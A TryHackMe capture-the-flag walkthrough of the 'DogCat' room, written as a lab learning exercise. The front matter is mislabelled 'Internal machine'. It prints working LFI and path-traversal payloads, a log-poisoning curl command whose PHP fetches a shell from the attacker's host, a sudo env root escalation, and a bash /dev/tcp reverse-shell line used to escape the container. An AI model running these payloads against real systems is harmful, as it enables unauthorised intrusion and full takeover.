---
title: "Internal machine tryhackme writeup"
excerpt_separator: "<!--more-->"
date: 2023-11-18
categories:
  - TryHackMe Writeups
tags:
  - Hacking
  - Notes
  - writeup
  - ctf
---

### DogCat — TryHackMe Walkthrough

- *My writeups are more of my own mind-map than an "official" walkthrough, it may not seem straightforward sometimes but that's just the beauty of my own thinking.*

## Foothold:

- For recon the usual ***nmap*** + ***gobuster*** as starters.
- I found 3 open ports 80,22 and 1055 of anosys which is new but that wasn’t the exploitable part so it was a rabbit hole.
- The website is a simple web page that gives pictures of cats or dogs when you ask for it, the search parameter called **view** accepts either cat or dog if i try something else it doesn’t work.
- Though i found the interesting part of our foothold which is “cat+your term” no space that gives an error that makes it clear we have to use it.
- After looking around I noticed that we can access the “**index**” page using this:

```php
view=/dog/../index
```

- It gives a different error after searching about it I found that somehow it meant we should encrypt the search item with bse64 as below:

```php
http://10.10.148.135/?view=php://filter/read=convert.base64-encode/resource=./dog/../index
```

- It gives us the source code in php, after reading the code I knew that “**ext**” variable was vulnerable.
- The key was simply writing whatever we want and adding `&ext=` at the end to remove that variable which adds **.php** at the end of each search.

```php
http://10.10.148.135/?view=/dog/../../../../../../../../../var/log/apache2/access.log&ext=
```

- The next part will work only because upon examining the Apache2 logs, we noticed that the User-Agent field is unencoded and vulnerable to command injection.
- So first we create a php reverse shell (either the linux one or the pentest monkey one), we add our ip address and port and start up a ***netcat*** listener.
- in the directory where we created the shell we spin up a python http server:

```bash
python3 -m http.server 8080
```

- We forge a curl command as below:

```bash
curl -A "<?php file_put_contents('bshell.php',file_get_contents('http://@my_ip/shell.php'))>" -s http://@victim_ip/
```

- And we wait until we see the server receiving a GET request of our shell from the victim machine.
- visiting the @victim_ip/bshell.php leads to our netcat catching a reverse shell.
- the first flag is in the web page files and the second is in a directory before that.
- Now that we need two more flags we have to be root and certainly after `sudo -l` of the current user we can access env using root without password, a quick gtfobins visit we do this:

```bash
sudo env /bin/bash
```

- the third flag was in root directory and there was no sign of the fourth.
- Apparently we had to break out of the container interestingly enough there was a backup script in **/opt** so a simple reverse shell would do the trick:

```bash
echo "#!/bin/bash">backup.sh;echo "bash -i>/dev/tcp/@my_ip/3333 0>&1">>backup.sh
```

- spin up a netcat on port 3333 in our machine, run the script in the victim machine and we can have the fourth flag on the reversed shell and that’s it.